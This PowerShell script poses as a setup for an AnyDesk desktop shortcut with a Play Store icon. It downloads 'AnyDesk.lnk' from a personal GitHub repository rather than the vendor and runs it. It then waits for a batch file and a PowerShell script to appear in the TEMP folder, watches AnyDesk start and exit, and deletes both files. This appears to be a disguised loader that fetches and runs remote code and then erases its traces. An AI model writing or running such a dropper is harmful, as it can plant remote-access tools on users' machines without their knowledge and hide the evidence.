$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$desktop = [Environment]::GetFolderPath('Desktop')
$lnkPath = Join-Path $desktop 'AnyDesk.lnk'
$iconDir = Join-Path $env:LOCALAPPDATA 'AnyDeskLauncher'
$iconPath = Join-Path $iconDir 'anydesk.ico'
$webClient = New-Object Net.WebClient
$webClient.Headers.Add('User-Agent', 'Mozilla/5.0')

if (Test-Path $lnkPath) { Remove-Item $lnkPath -Force }

try {
    $html = $webClient.DownloadString('https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid')

    if ($html -match '(https://play-lh\.googleusercontent\.com/[^\s"&]+)') {
        $pngUrl = $matches[1] + '=s256'
        $pngBytes = $webClient.DownloadData($pngUrl)

        $width  = 256
        $height = 256
        if ($width -ge 256) { $width = 0 }
        if ($height -ge 256) { $height = 0 }

        $imageSize = $pngBytes.Length
        $offset    = 6 + 16

        $icoBytes = New-Object System.Collections.Generic.List[byte]

        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]0))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]1))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]1))

        $icoBytes.Add([byte]$width)
        $icoBytes.Add([byte]$height)
        $icoBytes.Add([byte]0)
        $icoBytes.Add([byte]0)
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]1))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt16]32))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt32]$imageSize))
        $icoBytes.AddRange([System.BitConverter]::GetBytes([UInt32]$offset))

        $icoBytes.AddRange($pngBytes)

        if (-not (Test-Path $iconDir)) {
            New-Item -ItemType Directory -Path $iconDir -Force | Out-Null
        }

        [System.IO.File]::WriteAllBytes($iconPath, $icoBytes.ToArray())
    } else {
        throw "Can't process URL."
    }
} catch {
    Write-Warning "Can't create icon: $_"
}


if (-not (Test-Path $lnkPath)) {
    $lnkUrl = 'https://github.com/wevertonmbrtx/anydesk/raw/refs/heads/main/AnyDesk.lnk'
    $webClient.DownloadFile($lnkUrl, $lnkPath)
}

if (Test-Path $lnkPath) {
    try {
        $ws = New-Object -ComObject WScript.Shell
        $shortcut = $ws.CreateShortcut($lnkPath)
        if (Test-Path $iconPath) {
            $shortcut.IconLocation = "$iconPath,0"
            $shortcut.Save()
        }
    } catch {
        Write-Warning "Can't update shortcut icon: $_"
    }

    Invoke-Item $lnkPath

    $batPath = "$env:TEMP\initad.bat"
    $progPath = "$env:TEMP\progress.ps1"

    $appeared = $false
    for ($i = 0; $i -lt 60; $i++) {
        if (Test-Path $batPath) { $appeared = $true; break }
        Start-Sleep -Seconds 1
    }

    if ($appeared) {
        $presentStreak = 0
        $phase1Deadline = (Get-Date).AddMinutes(5)
        while ((Get-Date) -lt $phase1Deadline -and $presentStreak -lt 3) {
            if (Get-Process -Name 'AnyDesk' -ErrorAction SilentlyContinue) {
                $presentStreak++
            } else {
                $presentStreak = 0
            }
            Start-Sleep -Seconds 2
        }

        $absentStreak = 0
        while ($absentStreak -lt 3) {
            if (Get-Process -Name 'AnyDesk' -ErrorAction SilentlyContinue) {
                $absentStreak = 0
            } else {
                $absentStreak++
            }
            Start-Sleep -Seconds 2
        }

        Start-Sleep -Seconds 2

        for ($i = 0; $i -lt 30; $i++) {
            if (-not (Test-Path $batPath)) { break }
            try {
                Remove-Item $batPath -Force -ErrorAction Stop
                break
            } catch {
                Start-Sleep -Seconds 2
            }
        }
        
        Remove-Item $progPath -Force -ErrorAction SilentlyContinue
    }
} else {
    Write-Warning "Can't find $lnkPath"
}
